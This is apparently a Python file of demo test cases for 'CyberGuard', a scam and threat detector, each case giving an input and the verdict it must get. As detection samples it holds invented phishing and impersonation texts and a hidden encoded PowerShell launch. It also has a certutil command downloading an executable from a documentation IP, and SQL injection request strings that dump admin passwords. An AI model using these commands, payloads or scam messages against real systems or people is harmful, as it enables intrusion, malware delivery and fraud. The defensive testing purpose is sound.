"""
CyberGuard demo cases - the exact inputs used in the live demo (docs/DEMO_SCRIPT.md), each with the verdict it must get.
demo_check.py runs every case through the same auto-routing the app uses and prints PASS / FAIL, so the demo is
checked before going on stage. All scam examples are invented for the demo (no real person, number or site); the
scam web addresses are made-up names that are NOT registered, so a scan contacts no phishing site, and the
attacker IP addresses are from the ranges reserved for documentation (203.0.113.x, 198.51.100.x), so no real
network is accused.

expect: "scam"  -> score must be >= 51 (suspicious or worse)
        "safe"  -> score must be <  51
"""
D = "2026-10-20"

CASES = [
    # ---------------- 1. Phishing ----------------
    {"id": "P1", "module": "phishing", "expect": "scam", "title": "SMS: parcel fee scam",
     "text": "India Post: Your parcel is on hold due to an incomplete address. Pay Rs 25 redelivery fee within 12 hours "
             "at http://indiapost-redeliver.top/pay or it will be returned."},
    {"id": "P2", "module": "phishing", "expect": "safe", "title": "SMS: real OTP message",
     "text": "482913 is your OTP for login to the BPUT student portal. Do not share it with anyone."},
    {"id": "P3", "module": "phishing", "subtopic": "social-media-analysis", "expect": "scam", "title": "Social DM: paid blue tick",
     "text": "Congratulations! You have been selected for the Instagram Blue Tick. Verify your account here: "
             "http://insta-verify-badge.top/login within 24 hours or the offer expires."},
    {"id": "P4", "module": "phishing", "subtopic": "social-media-analysis", "expect": "safe", "title": "Social post: normal post",
     "text": "Congrats to our team for winning the BPUT hackathon prelims! Proud of everyone #hackathon #odisha"},
    {"id": "P5", "module": "phishing", "expect": "scam", "title": "QR code: UPI refund scam",
     "file": "test_samples/qr_upi_refund_scam.png"},
    {"id": "P6", "module": "phishing", "expect": "scam", "title": "QR code: fake login page",
     "file": "test_samples/qr_fake_login.png"},

    # ---------------- 2. URL security ----------------
    {"id": "U1", "module": "url-security", "expect": "scam", "title": "Fake SBI login (look-alike, brand-new domain)",
     "url": "https://sbi-netbanking-login.top/retail/login"},
    {"id": "U2", "module": "url-security", "expect": "scam", "title": "Fake Microsoft 365 login",
     "url": "https://microsoft365-login-verify.cyou/owa"},
    {"id": "U3", "module": "url-security", "expect": "safe", "title": "Real SBI login",
     "url": "https://retail.onlinesbi.sbi/retail/login.htm"},
    {"id": "U4", "module": "url-security", "expect": "safe", "title": "Real university site",
     "url": "https://www.bput.ac.in/"},

    # ---------------- 3. Impersonation ----------------
    {"id": "I1", "module": "impersonation", "expect": "scam", "title": "Principal asks for gift cards",
     "text": "Hi, this is Principal Dr. Mishra. I'm in a meeting and can't talk. I need you to buy 5 Amazon gift cards "
             "of Rs 2000 each for a staff event and send me the codes urgently."},
    {"id": "I2", "module": "impersonation", "expect": "scam", "title": "Fake bank KYC",
     "text": "Dear customer, your SBI YONO account will be blocked today due to pending KYC. Update your PAN and "
             "Aadhaar immediately at http://sbi-kyc-update.top to avoid suspension."},
    {"id": "I3", "module": "impersonation", "expect": "scam", "title": "Fake police / digital arrest",
     "text": "This is Inspector Sharma from Mumbai Cyber Crime. A parcel with drugs in your name was seized. You are "
             "under digital arrest. Do not disconnect the video call and transfer Rs 50,000 for verification or we "
             "will issue an arrest warrant."},
    {"id": "I4", "module": "impersonation", "expect": "safe", "title": "Real college notice",
     "text": "Dear students, the mid-semester examination for 3rd semester will start from 3 November. The detailed "
             "routine is available on the college website."},

    # ---------------- 4. Credential theft / account takeover ----------------
    {"id": "C1", "module": "credential", "expect": "scam", "title": "Brute force, then the attacker gets in",
     "text": "\n".join([f"{D} 03:10:{i:02d} Failed password for ashis from 203.0.113.45 port 3{i:03d} ssh2" for i in range(12)]
                       + [f"{D} 03:11:02 Accepted password for ashis from 203.0.113.45 port 39999 ssh2"])},
    {"id": "C2", "module": "credential", "expect": "scam", "title": "Same-country takeover: new device, MFA off, mail forwarded",
     "text": "\n".join([f"2026-10-1{d} 10:0{d}:00 login success user=ashis ip=49.37.12.10 location=Bhubaneswar device=Windows Chrome"
                        for d in range(1, 8)]
                       + [f"{D} 23:50:00 login success user=ashis ip=198.51.100.77 location=Delhi new device Android Chrome",
                          f"{D} 23:52:00 MFA disabled for user=ashis",
                          f"{D} 23:53:00 inbox rule created: forward all mail to x.backup2026@proton.me"])},
    {"id": "C3", "module": "credential", "expect": "safe", "title": "Forgot password, then logged in",
     "text": "\n".join([f"{D} 09:0{i}:00 login failed user=ashis ip=49.37.12.10 wrong password" for i in range(3)]
                       + [f"{D} 09:04:00 login success user=ashis ip=49.37.12.10"])},

    # ---------------- 5. Cyber threat ----------------
    {"id": "T1", "module": "cyber-threat", "expect": "scam", "title": "Malware: Word opens hidden PowerShell that downloads a file",
     "text": "2026-10-20 02:14:07 EventID=4688 Host=LAB-PC-07 User=student ParentImage=C:\\Program Files\\Microsoft Office\\WINWORD.EXE "
             "Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell -nop -w hidden -enc "
             "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n"
             "2026-10-20 02:14:09 EventID=4688 Host=LAB-PC-07 User=student Image=C:\\Windows\\System32\\certutil.exe "
             "CommandLine=certutil -urlcache -split -f http://203.0.113.45/a.exe C:\\Users\\Public\\a.exe"},
    {"id": "T2", "module": "cyber-threat", "expect": "safe", "title": "Normal application log",
     "text": "2026-10-20 10:15:02 INFO app=erp user=ashis action=view_timetable status=200 duration_ms=84\n"
             "2026-10-20 10:15:40 INFO app=erp user=ashis action=download_admit_card status=200 duration_ms=120"},
    # API abuse (added 22 Oct; documentation IP addresses): an attacker probing the API with SQL injection, then a
    # normal API access log of the same shape
    {"id": "T3", "module": "cyber-threat", "expect": "scam", "title": "API abuse: SQL injection against the API",
     "text": "203.0.113.77 - - [21/Oct/2026:23:10:01 +0530] \"GET /api/v1/students?roll=21CSE045 HTTP/1.1\" 200 812\n"
             "203.0.113.77 - - [21/Oct/2026:23:10:03 +0530] \"GET /api/v1/students?roll=21CSE045%27%20OR%20%271%27%3D%271 HTTP/1.1\" 200 98213\n"
             "203.0.113.77 - - [21/Oct/2026:23:10:05 +0530] \"GET /api/v1/students?roll=1%27%20UNION%20SELECT%20username,password%20FROM%20admins--%20 HTTP/1.1\" 500 211"},
    {"id": "T4", "module": "cyber-threat", "expect": "safe", "title": "Normal API access log",
     "text": "198.51.100.23 - - [21/Oct/2026:10:02:11 +0530] \"GET /api/v1/students?roll=21CSE045 HTTP/1.1\" 200 812\n"
             "198.51.100.23 - - [21/Oct/2026:10:02:15 +0530] \"GET /api/v1/results?semester=4&roll=21CSE045 HTTP/1.1\" 200 1534\n"
             "198.51.100.23 - - [21/Oct/2026:10:02:40 +0530] \"POST /api/v1/feedback HTTP/1.1\" 201 64"},
    # Whole log FILES (added 23 Oct; real LogHub logs, licence in test_samples/LOGHUB_LICENSE.txt): upload them on
    # the Log Analysis page - every line is read and the incidents are summarised
    {"id": "L1", "module": "cyber-threat", "expect": "scam", "title": "Log file: real SSH server under password attack",
     "file": "test_samples/loghub_openssh_real_attacks.log"},
    {"id": "L2", "module": "cyber-threat", "expect": "safe", "title": "Log file: normal ZooKeeper server log",
     "file": "test_samples/loghub_zookeeper_normal.log"},
]

# Deepfake cases need your own files (put them in backend/demo_samples/, which git ignores):
#   real_photo.jpg   - a normal phone photo of a person            -> expect safe
#   ai_image.png     - an AI-generated picture (e.g. from an image generator) -> expect scam
#   fake_video.mp4   - a face-swap video (e.g. one Celeb-DF test video)       -> expect scam
#   real_video.mp4   - a normal phone video of a face                         -> expect safe
DEEPFAKE_FILES = [("D1", "real_photo.jpg", "safe"), ("D2", "ai_image.png", "scam"),
                  ("D3", "fake_video.mp4", "scam"), ("D4", "real_video.mp4", "safe")]

# Network capture cases need your own Wireshark captures (also in backend/demo_samples/; .pcap or .pcapng):
#   nmap_scan      - capture while you run nmap from Kali against YOUR OWN VM / machine  -> expect scam
#   normal_traffic - a few minutes of ordinary browsing on your own PC                  -> expect safe
NETWORK_FILES = [("N1", "nmap_scan", "scam"), ("N2", "normal_traffic", "safe")]

# Voice cases need your own recordings (also in backend/demo_samples/; any of .ogg .opus .m4a .mp3 .wav):
#   my_voice_clone - an AI clone of YOUR OWN voice (made with your consent)    -> expect scam
#   my_real_voice  - a normal voice note of you speaking (WhatsApp is fine)     -> expect safe
VOICE_FILES = [("V1", "my_voice_clone", "scam"), ("V2", "my_real_voice", "safe")]

# Insider Risk cases: REAL CERT r4.2 activity, made by app/ml/training/make_insider_demo.py into
# app/ml/training/data/insider/demo/ (git-ignored). "insider" = the CERT insider (named in insider_demo_answers.txt)
# must be first in the triage queue at alert level; "quiet" = no alert with a strong insider pattern.
INSIDER_FILES = [("I1", "insider_demo_leak", "insider"), ("I2", "insider_demo_jobtheft", "insider"),
                 ("I3", "insider_demo_spyware", "insider"), ("I4", "insider_demo_normal", "quiet")]
